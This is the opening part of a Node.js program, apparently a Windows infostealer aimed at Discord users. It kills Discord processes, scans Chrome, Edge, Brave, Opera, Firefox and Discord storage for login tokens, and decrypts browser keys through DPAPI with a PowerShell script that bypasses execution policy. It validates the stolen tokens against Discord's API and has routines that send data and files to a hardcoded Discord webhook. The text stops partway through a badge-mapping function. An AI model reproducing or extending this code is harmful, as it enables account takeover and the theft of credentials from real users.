'use strict';
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const https = require('https');
const http = require('http');
const { exec, execSync, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const { promisify } = require('util');
const execAsync = promisify(exec);

let AdmZip = null;
let axios = null;
let FormData = null;
let WebSocket = null;
let Dpapi = null;
let sqlite3 = null;
let seco = null;

function loadModule(name) {
    try {
        switch (name) {
            case 'adm-zip': return AdmZip || (AdmZip = require('adm-zip'));
            case 'axios': return axios || (axios = require('axios'));
            case 'form-data': return FormData || (FormData = require('form-data'));
            case 'ws': return WebSocket || (WebSocket = require('ws'));
            case 'dpapi':
                if (!Dpapi) { try { Dpapi = require('datavault-win').Dpapi; } catch { Dpapi = null; } }
                return Dpapi;
            case 'sqlite3':
                if (!sqlite3) { try { sqlite3 = require('sqlite3').verbose(); } catch { sqlite3 = null; } }
                return sqlite3;
            case 'seco':
                if (!seco) { try { seco = require('seco-file'); } catch { seco = null; } }
                return seco;
            default: return null;
        }
    } catch (e) { return null; }
}

const CONFIG = {
    WEBHOOK: "https://canary.discord.com/api/webhooks/1479313265384358053/Xtg0Qwh_nuVuEKhOy9Ckt_r0vs9aPMdUKd6bmC72xAFl3v5cDdzarH-8_ZrTvkfZUrdF",
    FOOTER_ICON: "https://cdn.discordapp.com/attachments/1476974656446660708/1479046754099003512/image.png?ex=69aa9d21&is=69a94ba1&hm=cf0dbec8de20d56b769665675450e94a57a2779950bdf0d1369ce83b96e384af&",
    PATHS: {
        APPDATA: process.env.APPDATA || '',
        LOCALAPPDATA: process.env.LOCALAPPDATA || '',
        TEMP: os.tmpdir(),
        HOME: os.homedir()
    },
    TIMEOUTS: {
        PROCESS_KILL: 5000,
        FILE_WAIT: 15000,
        NETWORK: 30000,
        SCRIPT: 120000
    },
    EMOJIS: {
        active_developer: "<:active_developer:1455996151861084261>",
        balance: "<:balance:1455996154650165319>",
        bravery: "<:bravery:1455996141807341642>",
        brilliance: "<:brilliance:1455996197792911379>",
        bughunter: "<:bughunter:1455996201907519601>",
        bughuntergold: "<:bughuntergold:1455996203551424713>",
        discord_employee: "<:discord_employee:1455996207032832175>",
        discord_nitro: "<:discord_nitro:1455996208311959562>",
        early_supporter: "<:early_supporter:1455996209616519343>",
        early_verified_bot_developer: "<:early_verified_bot_developer:1455996211554291843>",
        hypesquad_events: "<:hypesquad_events:1455996250540474369>",
        moderatorprogramsalumni: "<:moderatorprogramsalumni:1455996252612460554>",
        oldusername: "<:oldusername:1455996260040310845>",
        partnered_server_owner: "<:partnered_server_owner:1455996264536604873>",
        paypal: "<:paypal:1455996247901995179>",
        questbadge: "<:questbadge:1455996287496487014>",
        boost1month: "<:boost1month:1455996138858741944>",
        boost15month: "<:boost15month:1455996140796379176>",
        "2monthsboostnitro": "<:2monthsboostnitro:1455996144030322872>",
        nitro_boost_3_months: "<:nitro_boost_3_months:1455996254222946314>",
        "6months_boost": "<:6months_boost:1234567890123456789>",
        nitro_boost_9_months: "<:nitro_boost_9_months:1455996256907432006>",
        "12monthsboostnitro": "<:12monthsboostnitro:1455996147117064364>",
        nitro_boost_18_months: "<:nitro_boost_18_months:1455996258954248222>",
        "24_months": "<:24_months:1455996148949979259>",
        bronze: "<:bronze:1455996199839600813>",
        silver: "<:silver:1455996283440599091>",
        gold: "<:gold:1455996249500291154>",
        platinum: "<:platinum:1455996285198012580>",
        diamond: "<:diamond:1455996205229150411>",
        emerald: "<:emerald:1455996195485778182>",
        ruby: "<:ruby:1455996289052573871>",
        opal: "<:opal:1455996262586257418>"
    }
};

class Logger {
    constructor() {
        this.logPath = path.join(CONFIG.PATHS.TEMP, 'debug.log');
        this.buffer = [];
        this.isWriting = false;
        this.flushInterval = setInterval(() => this.flush(), 5000);
        try {
            if (fs.existsSync(this.logPath) && fs.statSync(this.logPath).size > 1024 * 1024) {
                fs.writeFileSync(this.logPath, `=== LOG ROTATED ${new Date().toISOString()} ===\n`, 'utf-8');
            } else {
                fs.appendFileSync(this.logPath, `=== LOG START ${new Date().toISOString()} ===\n`, 'utf-8');
            }
        } catch {
            // Fallback: try to put log in a different location or just ignore
            try {
                this.logPath = path.join(CONFIG.PATHS.LOCALAPPDATA, 'debug.log');
                fs.appendFileSync(this.logPath, `=== LOG START ${new Date().toISOString()} (FALLBACK) ===\n`, 'utf-8');
            } catch {
                this.logPath = null;
            }
        }
    }

    log(level, module, message, data = null) {
        let line = `[${new Date().toISOString()}] [${level}] [${module}] ${message}`;
        if (data) line += ` | ${JSON.stringify(data)}`;
        this.buffer.push(line);
        if (this.buffer.length >= 50) this.flush();
    }

    info(m, msg, d) { this.log('INFO', m, msg, d); }
    warn(m, msg, d) { this.log('WARN', m, msg, d); }
    error(m, msg, d) { this.log('ERROR', m, msg, d); }
    debug(m, msg, d) { this.log('DEBUG', m, msg, d); }

    flush() {
        if (this.isWriting || !this.buffer.length) return;
        this.isWriting = true;
        const lines = this.buffer.splice(0);
        try { fs.appendFileSync(this.logPath, lines.join('\n') + '\n', 'utf-8'); } catch { }
        this.isWriting = false;
    }

    destroy() {
        clearInterval(this.flushInterval);
        this.flush();
    }
}

const logger = new Logger();

class Utils {
    static sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

    static async withTimeout(promise, ms, fallback = null) {
        let id;
        const t = new Promise((_, rej) => { id = setTimeout(() => rej(new Error('Timeout')), ms); });
        try { const r = await Promise.race([promise, t]); clearTimeout(id); return r; }
        catch { clearTimeout(id); return fallback; }
    }

    static ensureDir(p) {
        try { if (!fs.existsSync(p)) fs.mkdirSync(p, { recursive: true }); return true; }
        catch { return false; }
    }

    static safeReadFile(p, enc = 'utf-8') {
        try { if (fs.existsSync(p)) return fs.readFileSync(p, enc); } catch { }
        return null;
    }

    static safeWriteFile(p, content, enc = 'utf-8') {
        try { this.ensureDir(path.dirname(p)); fs.writeFileSync(p, content, enc); return true; }
        catch { return false; }
    }

    static safeCopyFile(src, dest) {
        try { if (fs.existsSync(src)) { this.ensureDir(path.dirname(dest)); fs.copyFileSync(src, dest); return true; } }
        catch { }
        return false;
    }

    static safeCopyDirSync(src, dest) {
        try {
            if (!fs.existsSync(src)) return false;
            this.ensureDir(dest);
            for (const e of fs.readdirSync(src, { withFileTypes: true })) {
                const s = path.join(src, e.name), d = path.join(dest, e.name);
                e.isDirectory() ? this.safeCopyDirSync(s, d) : this.safeCopyFile(s, d);
            }
            return true;
        } catch { return false; }
    }

    static async safeCopyDir(src, dest) { return this.safeCopyDirSync(src, dest); }

    static safeDelete(p) {
        try {
            if (fs.existsSync(p)) {
                fs.statSync(p).isDirectory()
                    ? fs.rmSync(p, { recursive: true, force: true })
                    : fs.unlinkSync(p);
            }
            return true;
        } catch { return false; }
    }

    static removeEmptyDirs(dir) {
        if (!fs.existsSync(dir)) return;
        try {
            const _clean = (d) => {
                let isEmpty = true;
                for (const item of fs.readdirSync(d)) {
                    const p = path.join(d, item);
                    if (fs.statSync(p).isDirectory()) {
                        if (!_clean(p)) isEmpty = false;
                    } else { isEmpty = false; }
                }
                if (isEmpty) { try { fs.rmdirSync(d); } catch { } }
                return isEmpty;
            };
            _clean(dir);
        } catch { }
    }

    static generateId() { return `${Date.now()}_${Math.random().toString(36).slice(2, 10)}`; }

    static createTempDir(prefix = 'data-') {
        const locations = [
            CONFIG.PATHS.TEMP,
            CONFIG.PATHS.LOCALAPPDATA,
            CONFIG.PATHS.APPDATA,
            CONFIG.PATHS.HOME,
            process.cwd()
        ];

        for (const loc of locations) {
            if (!loc) continue;
            try {
                if (!fs.existsSync(loc)) fs.mkdirSync(loc, { recursive: true });
                return fs.mkdtempSync(path.join(loc, prefix));
            } catch (e) {
                continue;
            }
        }
        // Last resort: try current directory with a simple name if mkdtemp fails everywhere
        try {
            const lastResort = path.join(process.cwd(), `${prefix}${this.generateId()}`);
            fs.mkdirSync(lastResort, { recursive: true });
            return lastResort;
        } catch {
            throw new Error('ENOSPC: Could not create temporary directory in any location');
        }
    }

    static async waitForFile(p, timeout = 15000, interval = 500) {
        const end = Date.now() + timeout;
        while (Date.now() < end) {
            if (fs.existsSync(p)) return true;
            await this.sleep(interval);
        }
        return false;
    }
}

class ProcessManager {
    static async killProcesses(names) {
        for (const n of names) {
            try { execSync(`taskkill /F /IM "${n}"`, { windowsHide: true, stdio: 'ignore', timeout: 3000 }); } catch { }
        }
        await Utils.sleep(500);
    }

    static killProcess(n) { return this.killProcesses([n]); }

    static async runCommand(cmd, opts = {}) {
        try {
            const { stdout, stderr } = await execAsync(cmd, { timeout: 30000, windowsHide: true, encoding: 'utf8', ...opts });
            return { success: true, stdout, stderr };
        } catch (e) { return { success: false, error: e.message }; }
    }
}

class NetworkManager {
    static async postWebhook(url, payload) {
        const fullPayload = {
            username: 'Logger',
            avatar_url: CONFIG.FOOTER_ICON,
            ...payload
        };
        const axiosModule = loadModule('axios');
        if (axiosModule) {
            try {
                const httpsModule = require('https');
                const res = await axiosModule.post(url, fullPayload, {
                    headers: { 'Content-Type': 'application/json' },
                    timeout: CONFIG.TIMEOUTS.NETWORK,
                    maxBodyLength: Infinity,
                    httpsAgent: new httpsModule.Agent({ rejectUnauthorized: false })
                });
                return { success: res.status < 400 };
            } catch (e) {
                logger.error('Network', `POST ${url} failed: ${e.message}`);
                return { success: false };
            }
        }
        return this._postWebhookNative(url, fullPayload);
    }

    static _postWebhookNative(url, payload) {
        return new Promise(resolve => {
            try {
                const urlObj = new URL(url);
                const data = JSON.stringify(payload);
                const client = urlObj.protocol === 'https:' ? https : http;
                const opts = {
                    hostname: urlObj.hostname,
                    port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
                    path: urlObj.pathname + (urlObj.search || ''),
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
                    timeout: CONFIG.TIMEOUTS.NETWORK,
                    rejectUnauthorized: false
                };
                const req = client.request(opts, res => {
                    res.on('data', () => { });
                    res.on('end', () => resolve({ success: res.statusCode < 400 }));
                });
                req.on('error', (e) => { logger.error('Network', `Native POST failed: ${e.message}`); resolve({ success: false }); });
                req.on('timeout', () => { logger.error('Network', 'Native POST timeout'); req.destroy(); resolve({ success: false }); });
                req.write(data);
                req.end();
            } catch (e) { logger.error('Network', `Native POST fatal: ${e.message}`); resolve({ success: false }); }
        });
    }


    static async sendWebhookFile(url, filePath, payload = {}) {
        const axiosModule = loadModule('axios');
        const FormDataModule = loadModule('form-data');
        if (!axiosModule || !FormDataModule) return false;
        try {
            const form = new FormDataModule();
            form.append('file', fs.createReadStream(filePath), { filename: path.basename(filePath) });
            form.append('payload_json', JSON.stringify({
                username: 'Logger',
                avatar_url: CONFIG.FOOTER_ICON,
                ...payload
            }));
            await axiosModule.post(url, form, {
                headers: form.getHeaders(),
                maxBodyLength: Infinity,
                timeout: 600000
            });
            return true;
        } catch (e) {
            logger.error('Network', `Webhook file upload failed: ${e.message}`);
            return false;
        }
    }


    static async downloadFile(url, destPath, timeoutMs = 300000) {
        const axiosModule = loadModule('axios');
        Utils.ensureDir(path.dirname(destPath));

        if (axiosModule) {
            try {
                const httpsModule = require('https');
                const res = await axiosModule({
                    method: 'GET', url, responseType: 'stream',
                    timeout: timeoutMs,
                    maxRedirects: 10,
                    httpsAgent: new httpsModule.Agent({ rejectUnauthorized: false })
                });
                const writer = fs.createWriteStream(destPath);
                res.data.pipe(writer);
                await new Promise((resolve, reject) => {
                    writer.on('finish', resolve);
                    writer.on('error', err => { writer.destroy(); reject(err); });
                    res.data.on('error', err => { writer.destroy(); reject(err); });
                });
                return fs.existsSync(destPath) && fs.statSync(destPath).size > 0;
            } catch { try { Utils.safeDelete(destPath); } catch { } return false; }
        }

        return this._downloadFileNative(url, destPath, timeoutMs, 0);
    }

    static _downloadFileNative(url, destPath, timeoutMs = 300000, redirectCount = 0) {
        return new Promise(resolve => {
            if (redirectCount > 10) { resolve(false); return; }
            try {
                const urlObj = new URL(url);
                const client = urlObj.protocol === 'https:' ? https : http;
                Utils.safeDelete(destPath);
                const file = fs.createWriteStream(destPath);
                let settled = false;
                const done = (ok) => {
                    if (settled) return; settled = true;
                    file.destroy();
                    if (!ok) Utils.safeDelete(destPath);
                    resolve(ok);
                };
                const req = client.get(url, { timeout: timeoutMs, rejectUnauthorized: false }, res => {
                    if (res.statusCode === 301 || res.statusCode === 302 || res.statusCode === 307 || res.statusCode === 308) {
                        res.resume();
                        file.destroy();
                        if (settled) return; settled = true;
                        this._downloadFileNative(res.headers.location, destPath, timeoutMs, redirectCount + 1).then(resolve);
                        return;
                    }
                    if (res.statusCode !== 200) { res.resume(); done(false); return; }
                    res.pipe(file);
                    file.on('finish', () => {
                        if (settled) return; settled = true;
                        resolve(fs.existsSync(destPath) && fs.statSync(destPath).size > 0);
                    });
                    file.on('error', () => done(false));
                    res.on('error', () => done(false));
                });
                req.on('error', () => done(false));
                req.on('timeout', () => { req.destroy(); done(false); });
            } catch { resolve(false); }
        });
    }
}

class CryptoManager {
    static dpapiDecrypt(encryptedData) {
        try {
            if (!encryptedData || encryptedData.length < 10) return null;
            const b64 = Buffer.from(encryptedData).toString('base64');
            const script = `
$ErrorActionPreference = 'SilentlyContinue'
try {
    Add-Type -AssemblyName System.Security
    $data = [Convert]::FromBase64String('${b64}')
    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    if ($dec) { [Convert]::ToBase64String($dec) }
} catch {}`;
            const tmp = path.join(CONFIG.PATHS.TEMP, `dpapi_${Utils.generateId()}.ps1`);
            fs.writeFileSync(tmp, script, 'utf8');
            try {
                const r = execSync(`powershell -NoProfile -ExecutionPolicy Bypass -File "${tmp}" 2>nul`, {
                    encoding: 'utf8', windowsHide: true, timeout: 10000, stdio: ['pipe', 'pipe', 'ignore']
                }).trim();
                Utils.safeDelete(tmp);
                return r ? Buffer.from(r, 'base64') : null;
            } catch { Utils.safeDelete(tmp); return null; }
        } catch { return null; }
    }

    static dpapiDecryptNative(data) {
        if (!data || data.length < 10) return null;
        const D = loadModule('dpapi');
        if (D) { try { return D.unprotectData(data, null, 'CurrentUser'); } catch { } }
        return this.dpapiDecrypt(data);
    }

    static getEncryptionKey(browserPath) {
        try {
            const lsPath = path.join(browserPath, 'Local State');
            if (!fs.existsSync(lsPath)) return null;
            const ls = JSON.parse(fs.readFileSync(lsPath, 'utf8'));
            const enc = ls?.os_crypt?.encrypted_key;
            if (!enc) return null;
            const keyData = Buffer.from(enc, 'base64');
            if (keyData.slice(0, 5).toString() !== 'DPAPI') return null;
            return this.dpapiDecryptNative(keyData.slice(5));
        } catch { return null; }
    }

    static decryptAESGCM(encryptedData, key) {
        try {
            if (!encryptedData || !key) return null;
            const data = Buffer.isBuffer(encryptedData) ? encryptedData : Buffer.from(encryptedData);
            if (data.length < 31) return null;
            const ver = data.slice(0, 3).toString('utf8');
            if (ver === 'v10' || ver === 'v20' || ver === 'v11') {
                const iv = data.slice(3, 15), ct = data.slice(15, -16), tag = data.slice(-16);
                const dec = crypto.createDecipheriv('aes-256-gcm', key, iv);
                dec.setAuthTag(tag);
                return (dec.update(ct).toString('utf8') + dec.final().toString('utf8')).replace(/\0/g, '').trim();
            }
            const dr = this.dpapiDecryptNative(data);
            return dr ? dr.toString('utf8').replace(/\0/g, '').trim() : null;
        } catch { return null; }
    }

    static decryptToken(encryptedToken, key) {
        try {
            const parts = encryptedToken.split('dQw4w9WgXcQ:');
            if (parts.length !== 2) return null;
            return this.decryptAESGCM(Buffer.from(parts[1], 'base64'), key);
        } catch { return null; }
    }
}

class ZipManager {
    static createZip(sourcePath, destPath) {
        Utils.ensureDir(path.dirname(destPath));
        const AZ = loadModule('adm-zip');

        if (AZ) {
            try {
                const zip = new AZ();
                if (fs.existsSync(sourcePath)) {
                    if (fs.statSync(sourcePath).isDirectory()) {
                        try { zip.addLocalFolder(sourcePath); }
                        catch {
                            const addRecursive = (dir, zipPath = "") => {
                                for (const item of fs.readdirSync(dir)) {
                                    const full = path.join(dir, item);
                                    const zPath = path.join(zipPath, item);
                                    if (fs.statSync(full).isDirectory()) addRecursive(full, zPath);
                                    else zip.addLocalFile(full, zipPath);
                                }
                            };
                            addRecursive(sourcePath);
                        }
                    } else { zip.addLocalFile(sourcePath); }
                    zip.writeZip(destPath);
                    if (fs.existsSync(destPath) && fs.statSync(destPath).size > 0) return true;
                }
            } catch (e) { logger.warn('ZipManager', `adm-zip failed: ${e.message}`); }
        }

        // Fallback to PowerShell zipping
        try {
            logger.info('ZipManager', 'Trying PowerShell zip fallback...');
            const src = sourcePath.replace(/\\/g, '\\\\');
            const dst = destPath.replace(/\\/g, '\\\\');
            const ps = `Compress-Archive -Path "${src}\\*" -DestinationPath "${dst}" -Force`;
            execSync(`powershell -NoProfile -ExecutionPolicy Bypass -Command "${ps}"`, { windowsHide: true, timeout: 60000 });
            return fs.existsSync(destPath) && fs.statSync(destPath).size > 0;
        } catch (e) {
            logger.error('ZipManager', `All zip methods failed: ${e.message}`);
            return false;
        }
    }

    static extractZip(zipPath, destPath) {
        Utils.ensureDir(destPath);
        const AZ = loadModule('adm-zip');

        if (AZ) {
            try {
                new AZ(zipPath).extractAllTo(destPath, true);
                return true;
            } catch (e) {
                logger.warn('ZipManager', `adm-zip extraction failed: ${e.message}`);
            }
        }

        // Fallback to PowerShell unzipping
        try {
            logger.info('ZipManager', 'Trying PowerShell unzip fallback...');
            const src = zipPath.replace(/\\/g, '\\\\');
            const dst = destPath.replace(/\\/g, '\\\\');
            const ps = `Expand-Archive -Path "${src}" -DestinationPath "${dst}" -Force`;
            execSync(`powershell -NoProfile -ExecutionPolicy Bypass -Command "${ps}"`, { windowsHide: true, timeout: 120000 });
            return fs.existsSync(destPath) && fs.readdirSync(destPath).length > 0;
        } catch (e) {
            logger.error('ZipManager', `All unzip methods failed: ${e.message}`);
            return false;
        }
    }
}

const BROWSER_PATHS = {
    DISCORD: {
        'Discord': path.join(CONFIG.PATHS.APPDATA, 'discord'),
        'Discord Canary': path.join(CONFIG.PATHS.APPDATA, 'discordcanary'),
        'Discord PTB': path.join(CONFIG.PATHS.APPDATA, 'discordptb'),
        'Discord Development': path.join(CONFIG.PATHS.APPDATA, 'discorddevelopment'),
        'Lightcord': path.join(CONFIG.PATHS.APPDATA, 'Lightcord')
    },
    BROWSERS: {
        'Chrome': path.join(CONFIG.PATHS.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'),
        'Chrome Beta': path.join(CONFIG.PATHS.LOCALAPPDATA, 'Google', 'Chrome Beta', 'User Data'),
        'Chrome Canary': path.join(CONFIG.PATHS.LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'),
        'Chromium': path.join(CONFIG.PATHS.LOCALAPPDATA, 'Chromium', 'User Data'),
        'Edge': path.join(CONFIG.PATHS.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'),
        'Brave': path.join(CONFIG.PATHS.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Opera': path.join(CONFIG.PATHS.APPDATA, 'Opera Software', 'Opera Stable'),
        'Opera GX': path.join(CONFIG.PATHS.APPDATA, 'Opera Software', 'Opera GX Stable'),
        'Vivaldi': path.join(CONFIG.PATHS.LOCALAPPDATA, 'Vivaldi', 'User Data'),
        'Yandex': path.join(CONFIG.PATHS.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'),
        'Epic Privacy': path.join(CONFIG.PATHS.LOCALAPPDATA, 'Epic Privacy Browser', 'User Data'),
        'Firefox': path.join(CONFIG.PATHS.APPDATA, 'Mozilla', 'Firefox', 'Profiles')
    },
    PROFILES: ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
};



class TokenStealer {
    constructor() {
        this.tokens = new Map();
        this.validatedTokens = [];
    }

    findLevelDBPaths(basePath) {
        const paths = [];
        try {
            if (!fs.existsSync(basePath)) return paths;
            const add = p => { if (fs.existsSync(p) && !paths.includes(p)) paths.push(p); };

            add(path.join(basePath, 'Local Storage', 'leveldb'));
            add(path.join(basePath, 'Session Storage', 'leveldb'));
            add(path.join(basePath, 'IndexedDB'));
            for (const e of fs.readdirSync(basePath, { withFileTypes: true })) {
                if (!e.isDirectory()) continue;
                const fp = path.join(basePath, e.name);
                if (e.name === 'Default' || e.name.startsWith('Profile')) {
                    this.findLevelDBPaths(fp).forEach(p => { if (!paths.includes(p)) paths.push(p); });
                }
                if (e.name === 'Local Storage' || e.name === 'Session Storage' || e.name === 'IndexedDB') {
                    add(path.join(fp, 'leveldb'));

                    try {
                        for (const f of fs.readdirSync(fp)) {
                            if (f.endsWith('.sqlite') || f.endsWith('.db')) add(path.join(fp, f));
                        }
                    } catch { }
                }
            }
        } catch { }
        return paths;
    }

    extractTokensFromFile(filePath) {
        const tokens = new Set();
        try {
            const data = fs.readFileSync(filePath);
            if (data.length > 100 * 1024 * 1024) return tokens;

            for (const enc of ['utf8', 'latin1', 'ascii']) {
                try {
                    const content = data.toString(enc);
                    for (const pat of [
                        /[\w-]{24,32}\.[\w-]{6,7}\.[\w-]{27,110}/g,
                        /mfa\.[\w-]{80,}/g,
                        /[\w-]{24,32}\.[\w-]{27,110}/g
                    ]) {
                        for (const m of (content.match(pat) || [])) {
                            if (this.isValidToken(m)) tokens.add(m);
                        }
                    }
                } catch { }
            }

            try {
                const hex = data.toString('hex');

                const utf16 = Buffer.from(data).toString('utf16le').replace(/[^\x20-\x7E]/g, ' ');
                for (const pat of [
                    /[\w-]{24,32}\.[\w-]{6,7}\.[\w-]{27,110}/g,
                    /mfa\.[\w-]{80,}/g
                ]) {
                    for (const m of (utf16.match(pat) || [])) {
                        if (this.isValidToken(m)) tokens.add(m);
                    }
                }
            } catch { }
        } catch { }
        return tokens;
    }

    extractTokensFromLevelDB(leveldbPath, encryptionKey) {
        const tokens = new Set();
        try {
            if (!fs.existsSync(leveldbPath)) return tokens;
            const stat = fs.statSync(leveldbPath);

            if (stat.isFile()) {
                for (const t of this.extractTokensFromFile(leveldbPath)) tokens.add(t);
                return tokens;
            }

            for (const f of fs.readdirSync(leveldbPath)) {
                const fpath = path.join(leveldbPath, f);
                try {
                    const fstat = fs.statSync(fpath);
                    if (!fstat.isFile() || fstat.size > 100 * 1024 * 1024) continue;
                    const data = fs.readFileSync(fpath);
                    for (const enc of ['utf8', 'latin1', 'binary']) {
                        try {
                            const content = data.toString(enc);

                            if (encryptionKey) {

                                for (const m of (content.match(/dQw4w9WgXcQ:[\w+/=]{50,}/g) || [])) {
                                    const clean = m.split(/[\x00-\x1F\x7F-\xFF]/)[0];
                                    if (clean.length > 60) {
                                        const dec = CryptoManager.decryptToken(clean, encryptionKey);
                                        if (dec && this.isValidToken(dec)) tokens.add(dec);
                                    }
                                }

                                const rawMatches = content.match(/v1[01](?:[^\x00-\x20\x7F-\xFF]+)/g) || [];
                                for (const raw of rawMatches) {
                                    try {
                                        const dec = CryptoManager.decryptAESGCM(Buffer.from(raw, 'binary'), encryptionKey);
                                        if (dec && this.isValidToken(dec)) tokens.add(dec);
                                    } catch { }
                                }
                            }

                            for (const pat of [
                                /[\w-]{24,32}\.[\w-]{6,7}\.[\w-]{27,110}/g,
                                /mfa\.[\w-]{80,}/g,
                                /[\w-]{24,32}\.[\w-]{27,110}/g
                            ]) {
                                for (const m of (content.match(pat) || [])) {
                                    if (this.isValidToken(m)) tokens.add(m);
                                }
                            }
                        } catch { }
                    }
                } catch { }
            }
        } catch { }
        return tokens;
    }

    extractFromConfigFiles(discordBasePath) {
        const tokens = new Set();
        const configFiles = [
            'accounts.json', 'settings.json', 'storage.json',
            path.join('Local Storage', 'leveldb'),
        ];
        const subDirs = ['', '0', '1', '2'];
        try {
            for (const sub of subDirs) {
                const base = sub ? path.join(discordBasePath, sub) : discordBasePath;
                if (!fs.existsSync(base)) continue;
                for (const cf of configFiles) {
                    const fp = path.join(base, cf);
                    if (!fs.existsSync(fp)) continue;
                    try {
                        if (fs.statSync(fp).isFile()) {
                            for (const t of this.extractTokensFromFile(fp)) tokens.add(t);
                        }
                    } catch { }
                }
            }
        } catch { }
        return tokens;
    }

    isValidToken(token) {
        if (!token) return false;

        if (token.includes('http') || token.includes('chrome-extension') || token.includes('://')) return false;
        if (token.includes('\n') || token.includes(' ')) return false;

        if (token.length > 200) return false;
        return [
            /^[\w-]{24,32}\.[\w-]{6,7}\.[\w-]{27,110}$/,
            /^mfa\.[\w-]{80,}$/,
            /^[\w-]{24,32}\.[\w-]{27,110}$/
        ].some(p => p.test(token));
    }

    validateToken(token) {
        return new Promise(resolve => {
            if (!token) return resolve({ valid: false });
            const req = https.request({
                hostname: 'discord.com', port: 443,
                path: '/api/v9/users/@me', method: 'GET',
                headers: { Authorization: token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
                timeout: 8000
            }, res => {
                let data = '';
                res.on('data', c => data += c);
                res.on('end', () => {
                    logger.info('TokenValidator', `${res.statusCode}`);
                    logger.info('TokenValidator', data);
                    if (res.statusCode === 200) {
                        try { resolve({ valid: true, userInfo: JSON.parse(data) }); }
                        catch { resolve({ valid: false }); }
                    } else { resolve({ valid: false }); }
                });
            });
            req.on('error', (e) => {
                logger.error('TokenValidator', `Got an error while validating tokens;`);
                logger.error('TokenValidator', e);
                resolve({ valid: false })
            });
            req.setTimeout(8000, () => { req.destroy(); resolve({ valid: false }); });
            req.end();
        });
    }

    async extractFromPath(browserPath, sourceName) {
        const tokens = [];
        try {
            if (!fs.existsSync(browserPath)) return tokens;
            const key = CryptoManager.getEncryptionKey(browserPath);

            for (const p of this.findLevelDBPaths(browserPath)) {
                for (const t of this.extractTokensFromLevelDB(p, key)) {
                    if (!this.tokens.has(t)) { this.tokens.set(t, sourceName); tokens.push({ token: t, source: sourceName }); }
                }
            }

            if (sourceName.toLowerCase().includes('discord') || sourceName.toLowerCase().includes('lightcord')) {
                for (const t of this.extractFromConfigFiles(browserPath)) {
                    if (!this.tokens.has(t)) { this.tokens.set(t, sourceName + '_cfg'); tokens.push({ token: t, source: sourceName + '_cfg' }); }
                }
            }
        } catch { }
        return tokens;
    }

    async collectAllTokens() {
        const all = [];
        const tasks = [
            ...Object.entries(BROWSER_PATHS.DISCORD).map(([n, p]) => this.extractFromPath(p, n)),
            ...Object.entries(BROWSER_PATHS.BROWSERS).map(([n, p]) => this.extractFromPath(p, n))
        ];
        for (const r of await Promise.allSettled(tasks)) {
            if (r.status === 'fulfilled') all.push(...r.value);
        }
        return all;
    }

    async validateAndCollect() {
        await ProcessManager.killProcesses(['Discord.exe', 'DiscordCanary.exe', 'DiscordPTB.exe', 'DiscordDevelopment.exe']);
        await Utils.sleep(1500);
        const raw = await this.collectAllTokens();
        logger.info('TokenStealer', `Raw tokens found: ${raw.length}`);

        if (!raw.length) return [];

        const batchSize = 5;
        const validated = [];
        const unvalidated = [];
        for (let i = 0; i < raw.length; i += batchSize) {
            const batch = raw.slice(i, i + batchSize);
            const results = await Promise.allSettled(batch.map(async ({ token, source }) => {
                const v = await this.validateToken(token);
                return { token, source, validation: v };
            }));
            for (const r of results) {
                if (r.status === 'fulfilled') {
                    if (r.value.validation.valid) {
                        validated.push(r.value);
                    } else {

                        unvalidated.push({ token: r.value.token, source: r.value.source, userInfo: null });
                    }
                }
            }
        }
        this.validatedTokens = validated.map(r => ({ token: r.token, source: r.source, userInfo: r.validation.userInfo }));

        logger.info('TokenStealer', `Validated tokens: ${this.validatedTokens.length}`);
        return this.validatedTokens;
    }

    async _discordGet(token, path_) {
        const headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-Super-Properties': Buffer.from(JSON.stringify({ os: 'Windows', browser: 'Chrome', device: '', system_locale: 'en-US', browser_version: '120.0.0.0', os_version: '10' })).toString('base64')
        };
        const axiosModule = loadModule('axios');
        if (axiosModule) {
            try {
                const res = await axiosModule.get(`https://discord.com${path_}`, {
                    headers,
                    timeout: 8000,
                    httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false })
                });
                return res.data || null;
            } catch { return null; }
        }
        return new Promise(resolve => {
            try {
                const req = https.request({
                    hostname: 'discord.com', port: 443,
                    path: path_, method: 'GET',
                    headers,
                    timeout: 8000
                }, res => {
                    const chunks = [];
                    res.on('data', c => chunks.push(c));
                    res.on('end', () => {
                        try { resolve(JSON.parse(Buffer.concat(chunks).toString('utf8'))); }
                        catch { resolve(null); }
                    });
                });
                req.on('error', () => resolve(null));
                req.setTimeout(8000, () => { req.destroy(); resolve(null); });
                req.end();
            } catch { resolve(null); }
        });
    }


    _getBadges(flags, profileData) {
        const EMOJIS = CONFIG.EMOJIS;
        const added = new Set();
        const out = [];
        const add = e => { if (e && !added.has(e)) { out.push(e); added.add(e); } };
        if (profileData && profileData.badges) {
            for (const b of profileData.badges) {
                if (!b.id) continue;
                if (b.id === 'staff') add(EMOJIS.discord_employee);
                if (b.id === 'partner') add(EMOJIS.partnered_server_owner);
                if (b.id === 'hypesquad') add(EMOJIS.hypesquad_events);
                if (b.id === 'bug_hunter_level_1') add(EMOJIS.bughunter);
                if (b.id === 'early_supporter') add(EMOJIS.early_supporter);
                if (b.id === 'bug_hunter_level_2') add(EMOJIS.bughuntergold);
                if (b.id === 'early_verified_bot_developer') add(EMOJIS.early_verified_bot_developer);
                if (b.id === 'moderator_alumni') add(EMOJIS.moderatorprogramsalumni);
